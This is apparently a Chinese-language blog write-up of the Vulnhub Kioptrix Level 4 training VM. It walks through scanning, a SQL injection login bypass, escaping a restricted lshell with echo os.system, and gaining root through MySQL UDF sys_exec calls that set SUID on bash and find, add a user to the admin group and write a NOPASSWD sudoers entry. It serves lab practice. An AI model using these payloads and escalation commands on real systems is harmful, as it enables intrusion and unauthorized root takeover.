---
title: KIOPTRIX LEVEL 4 
date: 2024-01-28 
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/Kioptrix-level4.html"
---

# KIOPTRIX LEVEL 4

![image-20240127185740686](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401281205884.png)

Description大概是表述作者感悟，制作这些靶场相当不容易，为作者点赞！

下载下来只有一块硬盘，这是没错的，作者提到了：

![image-20240127190552151](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401281205886.png)

![image-20240128130135069](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401281301380.png)

创建一个虚拟机，删除原有硬盘，使用现有硬盘：

![image-20240127191009399](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401281205888.png)

然后打开：

![image-20240127191358361](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401281205889.png)

扫一下，看看能不能扫出来：

```shell
sudo arp-scan -l
# sudo netdiscover -i eth0
```

![image-20240127191434358](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401281205890.png)

打开看一下能不能正常打开：

![image-20240127191954278](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401281205891.png)

正常打开的，下面就可以开始攻击了！

## 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401281205892.png" alt="image-20240128090300064" style="zoom:33%;" />

查看了一下基础配置。

尝试对上面的网页进行 sql 测试：

```text
username: ` or 1 = ' 1 
passoword:` or 1 = ' 1 

# Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in /var/www/checklogin.php on line 28
Wrong Username or Password
```

说明存在注入点。

## 端口扫描

```shell
nmap -sV -n -T4 -A 192.168.244.141
# Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-27 20:17 EST
# Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
# Service scan Timing: About 75.00% done; ETC: 20:17 (0:00:04 remaining)
# Nmap scan report for 192.168.244.141
# Host is up (0.0012s latency).
# Not shown: 566 closed tcp ports (conn-refused), 430 filtered tcp ports (no-response)
# PORT    STATE SERVICE     VERSION
# 22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
# | ssh-hostkey: 
# |   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
# |_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
# 80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
# |_http-title: Site doesn't have a title (text/html).
# |_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
# 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
# 445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Host script results:
# |_smb2-time: Protocol negotiation failed (SMB2)
# |_clock-skew: mean: 10h29m59s, deviation: 3h32m07s, median: 7h59m59s
# |_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
# | smb-security-mode: 
# |   account_used: guest
# |   authentication_level: user
# |   challenge_response: supported
# |_  message_signing: disabled (dangerous, but default)
# | smb-os-discovery: 
# |   OS: Unix (Samba 3.0.28a)
# |   Computer name: Kioptrix4
# |   NetBIOS computer name: 
# |   Domain name: localdomain
# |   FQDN: Kioptrix4.localdomain
# |_  System time: 2024-01-28T04:17:53-05:00

# Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done: 1 IP address (1 host up) scanned in 14.52 seconds

# rustscan -a 10.0.10.103 -- -sV -oA result.txt 也行
```

可以看到开启了`22`，`80`，`139`，`445`，且服务版本大致为`OpenSSH 4.7`，`Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)`，`Samba smbd 3.X - 4.X，Samba smbd 3.0.28a`

## 目录扫描

```shell
gobuster dir -u http://192.168.244.141 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x*
# ===============================================================
# Gobuster v3.6
# by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
# ===============================================================
# [+] Url:                     http://192.168.244.141
# [+] Method:                  GET
# [+] Threads:                 10
# [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
# [+] Negative Status codes:   404
# [+] User Agent:              gobuster/3.6
# [+] Extensions:              *
# [+] Timeout:                 10s
# ===============================================================
# Starting gobuster in directory enumeration mode
# ===============================================================
# /images               (Status: 301) [Size: 358] [--> http://192.168.244.141/images/]
# /index                (Status: 200) [Size: 1255]
# /member               (Status: 302) [Size: 220] [--> index.php]
# /logout               (Status: 302) [Size: 0] [--> index.php]
# /john                 (Status: 301) [Size: 356] [--> http://192.168.244.141/john/]
# /robert               (Status: 301) [Size: 358] [--> http://192.168.244.141/robert/]
# /server-status        (Status: 403) [Size: 335]
# Progress: 415286 / 415288 (100.00%)
# ===============================================================
# Finished
# ===============================================================
```

发现了两个用户`john`还有`rebort`，尝试万能密码登录：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401281205893.png" alt="image-20240128095012371" style="zoom:50%;" />

进去了：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401281205894.png" alt="image-20240128095034531" style="zoom:33%;" />

## 突破限制的shell

尝试远程连接：

```shell
┌──(kali㉿kali)-[~]
└─$ ssh john@192.168.244.141                                   
Unable to negotiate with 192.168.244.141 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
                                                                                                                
┌──(kali㉿kali)-[~]
└─$ ssh -oHostKeyAlgorithms=+ssh-dss john@192.168.244.141
The authenticity of host '192.168.244.141 (192.168.244.141)' can't be established.
DSA key fingerprint is SHA256:l2Z9xv+mXqcandVHZntyNeV1loP8XoFca+R/2VbroAw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.244.141' (DSA) to the list of known hosts.
john@192.168.244.141's password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$ whoami
*** unknown command: whoami
john:~$ ls
john:~$ id
*** unknown command: id
```

这个兼容性是老问题了，下次单独搞一下！可以看到，虽然连接上去了，但是是一种受限环境，查看一下哪些命令可以使用：

```shell
john:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
```

简单查看一下目录结构：

```bash
john:~$ cd ..
*** forbidden path -> "/home/"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
john:~$ ls
john:~$ lpath
Allowed:
 /home/john
```

其他的命令没啥好说的，这个`echo`是可以利用一下的，可以参考这篇文章：[lshell](https://www.aldeid.com/wiki/Lshel)

```shell
echo $PATH
# *** forbidden path -> "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
# *** You have 0 warning(s) left, before getting kicked out.
# This incident has been reported.
echo os.system("/bin/bash")
# john@Kioptrix4:~$ whoami
# john
```

## 提权

搜索系统信息和内核信息：

```shell
uname -a
# Linux Kioptrix4 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
lsb_release -a
# No LSB modules are available.
# Distributor ID: Ubuntu
# Description:    Ubuntu 8.04.3 LTS
# Release:        8.04
# Codename:       hardy
```

尝试从内核漏洞上入手，但是这边尝试了几个脚本都失败了，看来还是得从其他方面入手。

查看一下高权限的进程：

```bash
ps aux | grep root
# root         1  0.0  0.0   2844  1696 ?        Ss   03:57   0:02 /sbin/init
# root         2  0.0  0.0      0     0 ?        S<   03:57   0:00 [kthreadd]
# root         3  0.0  0.0      0     0 ?        S<   03:57   0:00 [migration/0]
# root         4  0.0  0.0      0     0 ?        S<   03:57   0:00 [ksoftirqd/0]
# root         5  0.0  0.0      0     0 ?        S<   03:57   0:00 [watchdog/0]
# root         6  0.0  0.0      0     0 ?        S<   03:57   0:00 [migration/1]
# root         7  0.0  0.0      0     0 ?        S<   03:57   0:00 [ksoftirqd/1]
# root         8  0.0  0.0      0     0 ?        S<   03:57   0:00 [watchdog/1]
# root         9  0.0  0.0      0     0 ?        R<   03:57   0:00 [events/0]
# root        10  0.0  0.0      0     0 ?        S<   03:57   0:00 [events/1]
# root        11  0.0  0.0      0     0 ?        S<   03:57   0:00 [khelper]
# root        46  0.0  0.0      0     0 ?        S<   03:57   0:00 [kblockd/0]
# root        47  0.0  0.0      0     0 ?        S<   03:57   0:00 [kblockd/1]
# root        50  0.0  0.0      0     0 ?        S<   03:57   0:00 [kacpid]
# root        51  0.0  0.0      0     0 ?        S<   03:57   0:00 [kacpi_notify]
# root       189  0.0  0.0      0     0 ?        S<   03:57   0:00 [kseriod]
# root       233  0.0  0.0      0     0 ?        S    03:57   0:00 [pdflush]
# root       234  0.0  0.0      0     0 ?        S    03:57   0:00 [pdflush]
# root       235  0.0  0.0      0     0 ?        S<   03:57   0:00 [kswapd0]
# root       277  0.0  0.0      0     0 ?        S<   03:57   0:00 [aio/0]
# root       278  0.0  0.0      0     0 ?        S<   03:57   0:00 [aio/1]
# root      1496  0.0  0.0      0     0 ?        S<   03:57   0:00 [ata/0]
# root      1499  0.0  0.0      0     0 ?        S<   03:57   0:00 [ata/1]
# root      1502  0.0  0.0      0     0 ?        S<   03:57   0:00 [ata_aux]
# root      1511  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_0]
# root      1514  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_1]
# root      1596  0.0  0.0      0     0 ?        S<   03:57   0:00 [ksuspend_usbd]
# root      1599  0.0  0.0      0     0 ?        S<   03:57   0:00 [khubd]
# root      2433  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_2]
# root      2536  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_3]
# root      2537  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_4]
# root      2538  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_5]
# root      2539  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_6]
# root      2540  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_7]
# root      2541  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_8]
# root      2542  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_9]
# root      2543  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_10]
# root      2544  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_11]
# root      2545  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_12]
# root      2546  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_13]
# root      2547  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_14]
# root      2548  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_15]
# root      2549  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_16]
# root      2550  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_17]
# root      2551  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_18]
# root      2552  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_19]
# root      2553  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_20]
# root      2554  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_21]
# root      2555  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_22]
# root      2556  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_23]
# root      2557  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_24]
# root      2558  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_25]
# root      2559  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_26]
# root      2560  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_27]
# root      2561  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_28]
# root      2562  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_29]
# root      2563  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_30]
# root      2564  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_31]
# root      2565  0.0  0.0      0     0 ?        S<   03:57   0:00 [scsi_eh_32]
# root      2795  0.0  0.0      0     0 ?        S<   03:57   0:00 [kjournald]
# root      2966  0.0  0.0   2224   668 ?        S<s  03:57   0:00 /sbin/udevd --daemon
# root      3401  0.0  0.0      0     0 ?        S<   03:57   0:00 [kgameportd]
# root      3465  0.0  0.0      0     0 ?        S<   03:57   0:00 [kpsmoused]
# root      4772  0.0  0.0   1716   484 tty4     Ss+  03:57   0:00 /sbin/getty 38400 tty4
# root      4773  0.0  0.0   1716   492 tty5     Ss+  03:57   0:00 /sbin/getty 38400 tty5
# root      4777  0.0  0.0   1716   488 tty2     Ss+  03:57   0:00 /sbin/getty 38400 tty2
# root      4779  0.0  0.0   1716   484 tty3     Ss+  03:57   0:00 /sbin/getty 38400 tty3
# root      4783  0.0  0.0   1716   492 tty6     Ss+  03:57   0:00 /sbin/getty 38400 tty6
# root      4840  0.0  0.0   1872   540 ?        S    03:57   0:00 /bin/dd bs 1 if /proc/kmsg of /var/run/klogd/kmsg
# root      4861  0.0  0.0   5316   984 ?        Ss   03:57   0:00 /usr/sbin/sshd
# root      4917  0.0  0.0   1772   524 ?        S    03:57   0:00 /bin/sh /usr/bin/mysqld_safe
# root      4959  0.0  0.3 126988 16260 ?        Sl   03:57   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking -
# root      4960  0.0  0.0   1700   556 ?        S    03:57   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
# root      5034  0.0  0.0   6528  1324 ?        Ss   03:57   0:00 /usr/sbin/nmbd -D
# root      5036  0.0  0.0  10108  2400 ?        Ss   03:57   0:00 /usr/sbin/smbd -D
# root      5050  0.0  0.0   8084  1340 ?        Ss   03:57   0:00 /usr/sbin/winbindd
# root      5063  0.0  0.0  10108  1024 ?        S    03:57   0:00 /usr/sbin/smbd -D
# root      5071  0.0  0.0   8084  1164 ?        S    03:57   0:00 /usr/sbin/winbindd
# root      5083  0.0  0.0   2104   892 ?        Ss   03:57   0:00 /usr/sbin/cron
# root      5105  0.0  0.1  20464  6200 ?        Ss   03:57   0:00 /usr/sbin/apache2 -k start
# root      5161  0.0  0.0   1716   488 tty1     Ss+  03:57   0:00 /sbin/getty 38400 tty1
# root      5199  0.0  0.0   8084   868 ?        S    04:17   0:00 /usr/sbin/winbindd
# root      5200  0.0  0.0   8092  1268 ?        S    04:17   0:00 /usr/sbin/winbindd
# root      5279  0.0  0.0  11356  3716 ?        Ss   05:01   0:00 sshd: john [priv]
# john      5331  0.0  0.0   3008   772 pts/0    R+   05:13   0:00 grep root
```

这里倒是发现 mysql 似乎是 root 权限。

查看一下是否有SUID方面的：

```shell
find / -perm -u=s -type f 2>/dev/null
# /usr/lib/apache2/suexec
# /usr/lib/eject/dmcrypt-get-device
# /usr/lib/openssh/ssh-keysign
# /usr/lib/pt_chown
# /usr/bin/chsh
# /usr/bin/sudo
# /usr/bin/traceroute6.iputils
# /usr/bin/newgrp
# /usr/bin/sudoedit
# /usr/bin/chfn
# /usr/bin/arping
# /usr/bin/gpasswd
# /usr/bin/mtr
# /usr/bin/passwd
# /usr/bin/at
# /usr/sbin/pppd
# /usr/sbin/uuidd
# /lib/dhcp3-client/call-dhclient-script
# /bin/mount
# /bin/ping6
# /bin/fusermount
# /bin/su
# /bin/ping
# /bin/umount
# /sbin/umount.cifs
# /sbin/mount.cifs
```

没看到我觉得可以利用的。

查看一下目录结构，看看是否有可以利用的地方：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401281205895.png" alt="image-20240128102000812" style="zoom: 67%;" />

在`checklogin.php`中发现了账号密码，尝试进行登录：

```shell
john@Kioptrix4:~$ mysql -uroot -p
# Enter password: 
# Welcome to the MySQL monitor.  Commands end with ; or \g.
# Your MySQL connection id is 19
# Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

# Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
mysql> show databases;                                                                                                         
# +--------------------+                                                                
# | Database           |                                                                
# +--------------------+                                                                
# | information_schema |                                                                
# | members            |                                                                
# | mysql              |                                                                                              
# +--------------------+                                                                                           
# 3 rows in set (0.00 sec)
mysql> select * from mysql.func;                                                                                               
# +-----------------------+-----+---------------------+----------+                           
# | name                  | ret | dl                  | type     |        
# +-----------------------+-----+---------------------+----------+                           
# | lib_mysqludf_sys_info |   0 | lib_mysqludf_sys.so | function |                           
# | sys_exec              |   0 | lib_mysqludf_sys.so | function |                           
# +-----------------------+-----+---------------------+----------+                           
# 2 rows in set (0.00 sec)                                                                                                     
mysql> select version(),user();                                                                                               # +--------------------+----------------+                                                     
# | version()          | user()         |                                                     
# +--------------------+----------------+                                                     
# | 5.0.51a-3ubuntu5.4 | root@localhost |                                                     
# +--------------------+----------------+                                                     
# 1 row in set (0.00 sec)                      
```

### 构造SUID提权

> mysql中没有执行外部命令的函数，要调用外部的命令，可以通过开发MySQL [UDF](https://so.csdn.net/so/search?q=UDF&spm=1001.2101.3001.7020)来实现，lib_mysqludf_sys 就是一个实现了此功能的UDF库
>
> 可以通过select 执行相关命令 如：Select  sys_exec('mkdir -p /home/user1/aaa');

尝试执行系统命令，构造suid：

```sql
select sys_exec("chmod u+s /usr/bin/bash");
select sys_exec("chmod u+s /usr/bin/find");
find /etc/passwd -exec /bin/sh \;
```

![image-20240128120032799](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401281205896.png)

获得 flag！

### 直接赋予john权限

```sql
select sys_exec("usermod -a -G admin john");
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401281205897.png" alt="image-20240128120500403" style="zoom:50%;" />

同样成功获取flag！！！

## 其他收获

看师傅们做的时候，发现师傅们使用了一个 SMB 枚举工具：

> enum4linux 是一个命令行工具，用于从远程系统枚举 Windows 和 Samba 信息。它是用 Perl 编写的，可用于在 Windows 和 Samba 系统上执行侦察。该工具可用于收集用户和组列表、共享资源等信息以及可用于识别潜在漏洞的其他信息。

```shell
# 安装一下
sudo apt install -y enum4linux-ng
enum4linux-ng 192.168.244.141
# ENUM4LINUX - next generation (v1.3.2)
#  ==========================
# |    Target Information    |
#  ==========================
# [*] Target ........... 192.168.244.141
# [*] Username ......... ''
# [*] Random Username .. 'zssfbtvj'
# [*] Password ......... ''
# [*] Timeout .......... 5 second(s)

#  ========================================
# |    Listener Scan on 192.168.244.141    |
#  ========================================
# [*] Checking LDAP
# [-] Could not connect to LDAP on 389/tcp: connection refused
# [*] Checking LDAPS
# [-] Could not connect to LDAPS on 636/tcp: connection refused
# [*] Checking SMB
# [+] SMB is accessible on 445/tcp
# [*] Checking SMB over NetBIOS
# [+] SMB over NetBIOS is accessible on 139/tcp

#  ==============================================================
# |    NetBIOS Names and Workgroup/Domain for 192.168.244.141    |
#  ==============================================================
# [+] Got domain/workgroup name: WORKGROUP
# [+] Full NetBIOS names information:
# - KIOPTRIX4       <00> -         B <ACTIVE>  Workstation Service                         
# - KIOPTRIX4       <03> -         B <ACTIVE>  Messenger Service                           
# - KIOPTRIX4       <20> -         B <ACTIVE>  File Server Service                         
# - ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser                             
# - WORKGROUP       <1d> -         B <ACTIVE>  Master Browser                             
# - WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections                   
# - WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name                       
# - MAC Address = 00-00-00-00-00-00                                                       
#  ============================================
# |    SMB Dialect Check on 192.168.244.141    |
#  ============================================
# [*] Trying on 445/tcp
# [+] Supported dialects and settings:
# Supported dialects:                                                                     
#   SMB 1.0: true                                                                         
#   SMB 2.02: false                                                                       
#   SMB 2.1: false                                                                         
#   SMB 3.0: false                                                                         
#   SMB 3.1.1: false                                                                       
# Preferred dialect: SMB 1.0                                                               
# SMB1 only: true                                                                         
# SMB signing required: false                                                             
# [*] Enforcing legacy SMBv1 for further enumeration

#  ==============================================================
# |    Domain Information via SMB session for 192.168.244.141    |
#  ==============================================================
# [*] Enumerating via unauthenticated SMB session on 445/tcp
# [+] Found domain information via SMB
# NetBIOS computer name: KIOPTRIX4                                                         
# NetBIOS domain name: ''                                                                 
# DNS domain: localdomain                                                                 
# FQDN: Kioptrix4.localdomain                                                             
# Derived membership: workgroup member                                                     
# Derived domain: unknown                                                                 

#  ============================================
# |    RPC Session Check on 192.168.244.141    |
#  ============================================
# [*] Check for null session
# [+] Server allows session using username '', password ''
# [*] Check for random user
# [+] Server allows session using username 'zssfbtvj', password ''
# [H] Rerunning enumeration with user 'zssfbtvj' might give more results

#  ======================================================
# |    Domain Information via RPC for 192.168.244.141    |
#  ======================================================
# [+] Domain: WORKGROUP
# [+] Domain SID: NULL SID
# [+] Membership: workgroup member

#  ==================================================
# |    OS Information via RPC for 192.168.244.141    |
#  ==================================================
# [*] Enumerating via unauthenticated SMB session on 445/tcp
# [+] Found OS information via SMB
# [*] Enumerating via 'srvinfo'
# [+] Found OS information via 'srvinfo'
# [+] After merging OS information we have the following result:
# OS: Linux/Unix (Samba 3.0.28a)                                                                                                                                                                       
# OS version: '4.9'                                                                       
# OS release: not supported                                                               
# OS build: not supported                                                                 
# Native OS: Unix                                                                         
# Native LAN manager: Samba 3.0.28a                                                       
# Platform id: '500'                                                                       
# Server type: '0x809a03'                                                                 
# Server type string: Wk Sv PrQ Unx NT SNT Kioptrix4 server (Samba, Ubuntu)               

#  ========================================
# |    Users via RPC on 192.168.244.141    |
#  ========================================
# [*] Enumerating users via 'querydispinfo'
# [+] Found 5 user(s) via 'querydispinfo'
# [*] Enumerating users via 'enumdomusers'
# [+] Found 5 user(s) via 'enumdomusers'
# [+] After merging user results we have 5 user(s) total:
# '1000':                                                                                 
#   username: root                                                                         
#   name: root                                                                             
#   acb: '0x00000010'                                                                     
#   description: (null)                                                                   
# '3000':                                                                                 
#   username: loneferret                                                                   
#   name: loneferret,,,                                                                   
#   acb: '0x00000010'                                                                     
#   description: (null)                                                                   
# '3002':                                                                                 
#   username: john                                                                         
#   name: ',,,'                                                                           
#   acb: '0x00000010'                                                                     
#   description: (null)                                                                   
# '3004':                                                                                 
#   username: robert                                                                       
#   name: ',,,'                                                                           
#   acb: '0x00000010'                                                                     
#   description: (null)                                                                   
# '501':                                                                                   
#   username: nobody                                                                       
#   name: nobody                                                                           
#   acb: '0x00000010'                                                                     
#   description: (null)                                                                   

#  =========================================
# |    Groups via RPC on 192.168.244.141    |
#  =========================================
# [*] Enumerating local groups
# [+] Found 0 group(s) via 'enumalsgroups domain'
# [*] Enumerating builtin groups
# [+] Found 0 group(s) via 'enumalsgroups builtin'
# [*] Enumerating domain groups
# [+] Found 0 group(s) via 'enumdomgroups'

#  =========================================
# |    Shares via RPC on 192.168.244.141    |
#  =========================================
# [*] Enumerating shares
# [+] Found 2 share(s):
# IPC$:                                                                                                                                                                                                
#   comment: IPC Service (Kioptrix4 server (Samba, Ubuntu))                               
#   type: IPC                                                                             
# print$:                                                                                 
#   comment: Printer Drivers                                                               
#   type: Disk        
                                                                     
# [*] Testing share IPC$
# [+] Mapping: OK, Listing: NOT SUPPORTED
# [*] Testing share print$
# [+] Mapping: DENIED, Listing: N/A

#  ============================================
# |    Policies via RPC for 192.168.244.141    |
#  ============================================
# [*] Trying port 445/tcp
# [+] Found policy:
# Domain password information:                                                                                                                                                                         
#   Password history length: None                                                         
#   Minimum password length: 5                                                             
#   Maximum password age: not set                                                         
#   Password properties:                                                                   
#   - DOMAIN_PASSWORD_COMPLEX: false                                                       
#   - DOMAIN_PASSWORD_NO_ANON_CHANGE: false                                               
#   - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false                                               
#   - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false                                               
#   - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false                                     
#   - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false                                       
# Domain lockout information:                                                             
#   Lockout observation window: 30 minutes                                                 
#   Lockout duration: 30 minutes                                                           
#   Lockout threshold: None                                                                                                                                                                            
# Domain logoff information:                                                               
#   Force logoff time: not set                                                             

#  ============================================
# |    Printers via RPC for 192.168.244.141    |
#  ============================================
# [+] No printers returned (this is not an error)

# Completed after 1.31 seconds
```



[Z神](https://www.bilibili.com/video/BV1tL41167uh/?spm_id_from=333.788&vd_source=8981ead94b755f367ac539f6ccd37f77)是进行添加了`sys_eval`函数进行UDF提权的，详情参考这个[blog](https://github.com/SEC-GO/Red-vs-Blue/blob/master/linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84MySQL%20UDF%E6%8F%90%E6%9D%83.md)

```sql
create function sys_eval returns string soname 'lib_mysqludf_sys.so';
# Query OK, 0 rows affected (0.00 sec)
select sys_eval("whoami");
+--------------------+
| sys_eval("whoami") |
+--------------------+
| root               | 
+--------------------+
1 row in set (0.01 sec)
```

然后就可以执行命令进行提权了！Z神接下来就是修改sudoers文件从而修改权限了！

```text
john ALL=NOPASSWD:ALL
```

后面有报错再重新更改文件拥有者即可。
